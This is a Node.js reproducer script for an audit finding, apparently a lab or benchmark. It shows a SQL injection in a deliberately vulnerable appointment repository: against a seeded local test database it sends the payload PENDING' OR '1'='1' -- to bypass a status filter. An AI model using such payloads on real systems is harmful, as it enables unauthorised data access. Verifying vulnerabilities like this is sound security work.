#!/usr/bin/env node
/**
 * Reproducer for finding-004: SQL Injection in VulnerableAppointmentRepository.findByStatus
 *
 * This script empirically demonstrates the SQL injection vulnerability
 * by calling the vulnerable findByStatus method with a malicious payload.
 */

import { VulnerableAppointmentRepository } from '@barberlab/core';
import { createSqlExecutor, closePool } from '@barberlab/core/infrastructure';
import {
  resetTestDatabase,
  runMigrations,
  getTestPool,
  closeTestPool,
} from '@barberlab/core/infrastructure';
import { createPasswordHasher } from '@barberlab/core/shared';
import { randomUUID } from 'node:crypto';
import type { AppointmentStatus } from '@barberlab/core';

// Set test database environment variables BEFORE creating executor
process.env.DB_HOST = 'localhost';
process.env.DB_PORT = '5432';
process.env.DB_NAME = 'barberlab_test';
process.env.DB_USER = 'barberlab';
process.env.DB_PASSWORD = 'changeme';

async function main() {
  console.log('=== Reproducer for finding-004: SQL Injection in findByStatus ===\n');

  let pool: ReturnType<typeof getTestPool>;

  try {
    // Close the main pool so it gets recreated with test config
    await closePool();

    await resetTestDatabase();
    await runMigrations('up');

    pool = getTestPool();

    // Create test data: barber and service for appointments
    const passwordHasher = createPasswordHasher();
    const passwordHash = await passwordHasher.hash('validpassword123');

    // Create a barber user and barber record
    const barberUserId = randomUUID();
    await pool.query(
      `INSERT INTO users (id, name, email, password_hash, role, status, created_at, updated_at)
       VALUES ($1, 'Test Barber', 'testbarber@test.com', $2, 'BARBER', 'ACTIVE', NOW(), NOW())
       RETURNING id`,
      [barberUserId, passwordHash]
    );
    const barberResult = await pool.query(
      `INSERT INTO barbers (id, user_id, name, phone, specialty, hire_date, active, created_at, updated_at)
       VALUES ($1, $2, 'Test Barber', '(11) 99999-1111', 'Corte', NOW(), true, NOW(), NOW())
       RETURNING id`,
      [randomUUID(), barberUserId]
    );
    const barberId = barberResult.rows[0].id;

    // Create a service
    const serviceResult = await pool.query(
      `INSERT INTO services (id, name, price, duration_minutes, active, created_at, updated_at)
       VALUES ($1, 'Test Service', '50.00', 30, true, NOW(), NOW())
       RETURNING id`,
      [randomUUID()]
    );
    const serviceId = serviceResult.rows[0].id;

    // Create a customer and appointments with different statuses
    const customerId = randomUUID();
    const userId = randomUUID();
    await pool.query(
      `INSERT INTO users (id, name, email, password_hash, role, status, created_at, updated_at)
       VALUES ($1, 'Test Customer', 'test@test.com', 'hash', 'CUSTOMER', 'ACTIVE', NOW(), NOW())
       RETURNING id`,
      [userId]
    );
    await pool.query(
      `INSERT INTO customers (id, user_id, name, phone, email, created_at, updated_at)
       VALUES ($1, $2, 'Test', '(11) 99999-0000', 'test@test.com', NOW(), NOW())
       RETURNING id`,
      [customerId, userId]
    );

    // Create TWO appointments with different statuses
    const appointmentId1 = randomUUID();
    const appointmentId2 = randomUUID();

    await pool.query(
      `INSERT INTO appointments (id, customer_id, barber_id, service_id, date_time, status, created_at, updated_at)
       VALUES ($1, $2, $3, $4, NOW() + INTERVAL '1 day', 'PENDING', NOW(), NOW())
       RETURNING id`,
      [appointmentId1, customerId, barberId, serviceId]
    );

    await pool.query(
      `INSERT INTO appointments (id, customer_id, barber_id, service_id, date_time, status, created_at, updated_at)
       VALUES ($1, $2, $3, $4, NOW() + INTERVAL '2 day', 'CONFIRMED', NOW(), NOW())
       RETURNING id`,
      [appointmentId2, customerId, barberId, serviceId]
    );

    console.log(`Created appointment 1: ${appointmentId1} (PENDING)`);
    console.log(`Created appointment 2: ${appointmentId2} (CONFIRMED)\n`);

    const vulnerableRepo = new VulnerableAppointmentRepository(createSqlExecutor());

    // ============================================================
    // TEST A: findByStatus with legitimate status (benign control)
    // ============================================================
    console.log('=== Test A: findByStatus with legitimate status (PENDING) ===');
    console.log('Input: "PENDING" (legitimate)\n');

    const legitimateResults = await vulnerableRepo.findByStatus(
      'PENDING' as unknown as AppointmentStatus
    );

    console.log(`Results returned: ${legitimateResults.length} appointment(s)`);
    legitimateResults.forEach((appt, idx) => {
      console.log(`  ${idx + 1}. Appointment ${appt.id} - Status: ${appt.status}`);
    });

    const allPending = legitimateResults.every(r => r.status === 'PENDING');
    if (allPending && legitimateResults.length === 1) {
      console.log(
        '\n✅ BENIGN CONTROL PASSED: Legitimate query returns only PENDING appointments\n'
      );
    } else {
      console.log('\n❌ BENIGN CONTROL FAILED: Unexpected results\n');
      return 1;
    }

    // ============================================================
    // TEST B: findByStatus with SQL Injection payload (attack)
    // ============================================================
    console.log('=== Test B: findByStatus with SQL Injection payload ===');
    console.log("Payload: \"PENDING' OR '1'='1' --\"");
    console.log('Expected: Bypass status filter, return ALL appointments (PENDING + CONFIRMED)\n');

    const maliciousStatus = `PENDING' OR '1'='1' --`;

    const injectionResults = await vulnerableRepo.findByStatus(
      maliciousStatus as unknown as AppointmentStatus
    );

    console.log(`Results returned: ${injectionResults.length} appointment(s)`);
    injectionResults.forEach((appt, idx) => {
      console.log(`  ${idx + 1}. Appointment ${appt.id} - Status: ${appt.status}`);
    });

    const statuses = injectionResults.map(r => r.status);
    const uniqueStatuses = [...new Set(statuses)];
    const hasBoth = uniqueStatuses.includes('PENDING') && uniqueStatuses.includes('CONFIRMED');

    if (hasBoth) {
      console.log('\n✅ SQL INJECTION SUCCESSFUL: Returned appointments of MULTIPLE statuses');
      console.log(
        '   The WHERE clause was bypassed, returning ALL appointments regardless of status.\n'
      );
      return 0;
    } else if (injectionResults.length > 1) {
      console.log('\n⚠️  PARTIAL INJECTION: Returned multiple appointments');
      return 0;
    } else {
      console.log('\n❌ INJECTION FAILED');
      return 1;
    }
  } catch (error) {
    console.error('\n❌ ERROR during reproduction:', error);
    return 1;
  } finally {
    await closeTestPool();
  }
}

main()
  .then(code => process.exit(code))
  .catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
  });
